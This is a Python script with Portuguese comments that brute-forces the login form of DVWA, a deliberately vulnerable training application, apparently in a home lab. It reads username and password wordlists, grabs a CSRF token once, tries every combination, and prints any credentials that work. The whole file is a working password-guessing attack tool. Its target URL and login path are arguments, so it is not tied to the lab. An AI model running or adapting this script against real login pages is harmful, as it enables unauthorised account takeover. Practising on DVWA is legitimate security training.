#!/usr/bin/env python3
"""
Uso:
  python3 dvwa_bruteforce.py --url http://192.168.56.20 --usuarios ../wordlists/users.txt --senhas ../wordlists/passwords.txt

"""

import argparse
import re
import sys
import time
from pathlib import Path

import requests


def carregar_lista(caminho):
    """Carrega lista de usuários ou senhas de um arquivo."""
    arquivo = Path(caminho)
    if not arquivo.exists():
        print(f"[!] Arquivo não encontrado: {caminho}")
        sys.exit(1)
    return [linha.strip() for linha in arquivo.read_text(encoding='utf-8', errors='ignore').splitlines() if linha.strip()]


def buscar_token(texto):
    """Busca token CSRF no HTML do formulário."""
    match = re.search(r'name=["\']user_token["\']\s+value=["\']([^"\']+)["\']', texto)
    if match:
        return match.group(1)
    return None


def tentar_login(sessao, url_login, usuario, senha, token=None):
    """Tenta fazer login com as credenciais fornecidas."""
    dados = {
        'username': usuario,
        'password': senha,
        'Login': 'Login'
    }
    if token:
        dados['user_token'] = token

    resposta = sessao.post(url_login, data=dados, allow_redirects=True, timeout=10)
    texto = resposta.text.lower()
    
    # DVWA normalmente contém "login failed" em tentativa falha (varia por versão)
    if 'login failed' in texto:
        return False
    # Heurística simples: presença de texto de boas-vindas
    if 'welcome' in texto or 'logout' in texto:
        return True
    # Caso ambíguo: considerar falha
    return False


def main():
    parser = argparse.ArgumentParser(description='Assistente de força bruta para DVWA (simples)')
    parser.add_argument('--url', required=True, help='URL base do DVWA (ex: http://192.168.56.20)')
    parser.add_argument('--caminho-login', default='/login.php', help='Caminho do formulário de login (padrão: /login.php)')
    parser.add_argument('--usuarios', required=True, help='Arquivo com nomes de usuário (um por linha)')
    parser.add_argument('--senhas', required=True, help='Arquivo com senhas (uma por linha)')
    parser.add_argument('--delay', type=float, default=0.2, help='Atraso entre tentativas em segundos')

    args = parser.parse_args()

    base = args.url.rstrip('/')
    url_login = base + args.caminho_login

    usuarios = carregar_lista(args.usuarios)
    senhas = carregar_lista(args.senhas)

    sessao = requests.Session()

    # Tentar obter token se presente
    try:
        resposta = sessao.get(url_login, timeout=10)
    except Exception as erro:
        print(f"[!] Erro ao buscar página de login: {erro}")
        sys.exit(1)

    token = buscar_token(resposta.text)
    if token:
        print(f"[*] Token user_token encontrado na página de login: {token}")
    else:
        print("[*] Nenhum token CSRF encontrado (ou formulário usa nome diferente). Continuando sem token.")

    print(f"[*] Iniciando força bruta: {len(usuarios)} usuários x {len(senhas)} senhas")

    for usuario in usuarios:
        for senha in senhas:
            print(f"Tentando {usuario}:{senha}")
            try:
                sucesso = tentar_login(sessao, url_login, usuario, senha, token)
            except Exception as erro:
                print(f"[!] Erro na requisição: {erro} — aguardando brevemente e tentando novamente")
                time.sleep(1)
                continue
            if sucesso:
                print(f"[+] SUCESSO: {usuario}:{senha}")
                return
            time.sleep(args.delay)

    print("[-] Concluído: nenhuma credencial válida encontrada (com as wordlists atuais).")


if __name__ == '__main__':
    main()
